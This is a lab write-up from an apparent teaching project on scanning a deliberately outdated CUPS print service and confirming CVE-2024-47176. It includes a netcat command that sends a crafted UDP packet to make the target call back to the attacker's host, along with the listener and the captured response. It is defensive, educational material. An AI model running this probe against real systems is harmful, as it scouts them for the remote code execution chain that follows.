# Activity: CUPS Print Service Reconnaissance

## Summary

Enumeration of the CUPS/cups-browsed print service on port 631, newly added to this VM. This activity documents discovery of the service, version identification, and confirmation of the CVE-2024-47176 detection-stage vulnerability (the unauthenticated UDP callback trigger), which is the precondition for the full RCE chain documented separately in the corresponding exploitation activity.

## Environment

| Item | Value |
|---|---|
| Target | 192.168.144.131 |
| Service | cupsd 2.4.2 / cups-browsed 1.28.17-3 (deliberately downgraded, pre-CVE-2024-47176 fix), port 631 (tcp + udp) |
| Attacker | Kali, 192.168.144.129 |
| Tooling | nmap, nc |

## Reconnaissance

### Step 1: Port discovery

```bash
nmap -sU -p 631 192.168.144.131
```

```
PORT    STATE         SERVICE
631/udp open|filtered ipp
```

As with earlier UDP findings in this project, `open|filtered` is inherently ambiguous and not conclusive on its own. The TCP side was previously confirmed loopback-only:

```
tcp   LISTEN 0      128             127.0.0.1:631        0.0.0.0:*    users:(("cupsd",...))
tcp   LISTEN 0      128                 [::1]:631           [::]:*    users:(("cupsd",...))
```

This means the web admin/IPP TCP interface is not remotely reachable; the entire attack surface here is the UDP side, served by `cups-browsed`.

### Step 2: Confirming the UDP service accepts unauthenticated attacker-controlled callbacks

Rather than relying on the ambiguous UDP scan result, the service was tested directly by sending a legacy CUPS browse-protocol packet and observing whether it triggers an outbound callback, the core mechanism behind CVE-2024-47176.

Packet format (four fields: type, state, printer URI, quoted location, quoted info):

```bash
printf '0 3 http://192.168.144.129:8000/printers/test "Office HQ" "Test Printer"' | nc -u -w1 192.168.144.131 631
```

Listener on the attacker side:

```bash
nc -lvnp 8000
```

Result:

```
Connection received on 192.168.144.131 37378
POST /printers/test HTTP/1.1
Content-Length: 182
Content-Type: application/ipp
User-Agent: CUPS/2.4.2 (Linux 6.1.0-27-amd64; x86_64) IPP/2.0
```

This confirms `cups-browsed` accepted the unsolicited UDP packet, without any authentication, and issued an outbound `Get-Printer-Attributes` IPP request to the exact URL specified in the packet. This is the precise behaviour CVE-2024-47176 describes: `cups-browsed` binds to `UDP 0.0.0.0:631` and trusts any packet from any source. The `User-Agent: CUPS/2.4.2` header confirms the response genuinely originates from the target's CUPS stack.

**Note on packet format:** an initial two-field test packet (`0 3 <uri>`, omitting the quoted location/info fields) produced no response at all. Only the complete four-field format triggered the callback, worth remembering since an incomplete/malformed packet is silently discarded rather than producing any error feedback, which can easily be mistaken for the service not being vulnerable at all.

### Step 3: NSE tooling check

```bash
ls -l /usr/share/nmap/scripts/ | grep -i cups
```

```
cups-info.nse
cups-queue-info.nse
```

Two CUPS-specific scripts exist. Both were run against the target:

```bash
nmap -p 631 --script cups-info,cups-queue-info -sU 192.168.144.132
```

**Neither script produced any output at all.** No error, no partial result, silence. This is consistent with the broader NSE reliability pattern already documented across this project (see `r-04- ftp-banner-grab-and-anonymous-access.md`, `r-18- smtp-enumeration.md`): a plausible explanation is that both scripts likely expect to interact with `cupsd`'s own IPP/HTTP interface (which, as established in this activity, is bound to loopback only and therefore genuinely unreachable from Kali), rather than with `cups-browsed`'s UDP callback mechanism, which is the actual attack surface this vulnerability depends on. Their silence here is therefore explainable and consistent with the target's real configuration, not an unexplained gap, but it's recorded for completeness and to reinforce that the manual UDP callback test in Step 2 remains the correct and necessary technique for this specific vulnerability, no NSE shortcut exists for it in this nmap installation.

## Outcome

Confirmed `cups-browsed` on port 631/udp accepts unauthenticated, attacker-controlled browse packets and will issue an outbound HTTP callback to any URL specified in the packet. This confirms the target is running a version genuinely vulnerable to CVE-2024-47176, the entry point for the full CVE-2024-47076/47175/47177 RCE chain, exploited in the corresponding exploitation activity.

## Remediation

See the corresponding exploitation activity for full remediation guidance.

## Lab Dependencies

**Prerequisite exploit(s):** None
**Required starting access:** Network access to the target from Kali
**Starting account:** None
**Resulting access:** N/A (callback confirmation only, no code execution at this stage)
**Provides access for:** Directly precedes and confirms the precondition for the full RCE chain
**Suggested teaching level:** Level 5–6 (unauthenticated service discovery and protocol-level vulnerability confirmation) as groundwork for the Level 7 full chain

## What is CUPS?

CUPS (Common Unix Printing System) is the standard print-management software used on Linux and most Unix-like systems. It runs as a background service that manages printers, print queues, and print jobs, and provides a web-based administration interface. `cups-browsed` is a companion daemon that automatically discovers shared network printers so they appear without manual configuration. Print servers are a common feature of real organisational networks (any office with shared printers has one), and, as with any always-on network service, they present a genuine attack surface if left unpatched or misconfigured.
